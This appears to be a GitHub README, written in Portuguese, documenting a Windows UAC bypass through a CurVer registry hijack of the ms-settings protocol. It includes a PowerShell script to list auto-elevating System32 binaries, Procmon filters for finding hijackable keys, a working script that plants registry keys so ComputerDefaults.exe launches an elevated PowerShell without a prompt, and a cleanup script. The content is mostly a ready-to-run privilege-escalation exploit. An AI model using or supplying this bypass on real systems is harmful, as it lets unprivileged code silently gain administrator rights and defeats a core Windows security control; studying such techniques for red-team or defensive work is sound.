# BypassUAC
Bypass UAC via CurVer


- Execução de script em powershell para visualizar softwares com Autoelevate, via manifest

```powershell
$System32Path = "C:\Windows\System32"

  

$Binaries = Get-ChildItem -Path $System32Path -Filter *.exe

  

$Candidates = foreach ($bin in $Binaries) {

  

    $match = Select-String -Path $bin.FullName -Pattern '<autoElevate>\s*true\s*</autoElevate>' -Quiet -ErrorAction SilentlyContinue

    if ($match) {

        [PSCustomObject]@{

            Name = $bin.Name

            Path = $bin.FullName

        }

    }

}


$Candidates | Format-Table -AutoSize
```

<img width="1158" height="949" alt="Pasted image 20260201195609" src="https://github.com/user-attachments/assets/e87be1b2-cacc-4602-a04c-d97fb85919a3" />

- Com isso, foram executados todos os binários

<img width="843" height="923" alt="Pasted image 20260201195629" src="https://github.com/user-attachments/assets/55bbbec5-62e5-495a-a18c-a04b87099db6" />


- Agora é preciso visualizar no procmon64, com os filtros:
	- Path contains CurVer
	- Result Contains NOT FOUND
	- Integrity is High


- Se observarmos o `ComputerDefaults`, vemos que tem o caminho `HKCU\Software\Classes\ms-settings\CurVer` habilitado para hijack
- Então precisamos executar:

```powershell
# Cria a chave CurVer para o protocolo ms-settings 
$curVerPath = "HKCU:\Software\Classes\ms-settings\CurVer" 

New-Item -Path $curVerPath -Force 

# Aponta para um nome de classe arbitrário (ex: 'PwnedSettings') 
Set-ItemProperty -Path $curVerPath -Name "(Default)" -Value "PwnedSettings"

$payloadPath = "HKCU:\Software\Classes\PwnedSettings\shell\open\command"
New-Item -Path $payloadPath -Force

# Define seu payload (neste caso, seu PowerShell com privilégio alto)
Set-ItemProperty -Path $payloadPath -Name "(Default)" -Value "powershell.exe -ExecutionPolicy Bypass -NoProfile"

# Adiciona o DelegateExecute para garantir que o ShellExecute não ignore a chave
New-ItemProperty -Path $payloadPath -Name "DelegateExecute" -Value "" -PropertyType String

```


- Agora é só rodar novamente o `ComputerDefaults.exe`
- Script de remoção do registo

```powershell
# 1. Remove o redirecionamento CurVer 
$curVerPath = "HKCU:\Software\Classes\ms-settings\CurVer" 

if (Test-Path $curVerPath) { 
  Remove-Item -Path $curVerPath -Recurse -Force 
  Write-Host "[+] Redirecionamento CurVer removido." -ForegroundColor Green 
}

 # 2. Remove a classe de payload personalizada 
$fakeClassPath = "HKCU:\Software\Classes\PwnedSettings" 

if (Test-Path $fakeClassPath) { 
  Remove-Item -Path $fakeClassPath -Recurse -Force 
  Write-Host "[+] Classe PwnedSettings removida." -ForegroundColor Green 
}
```
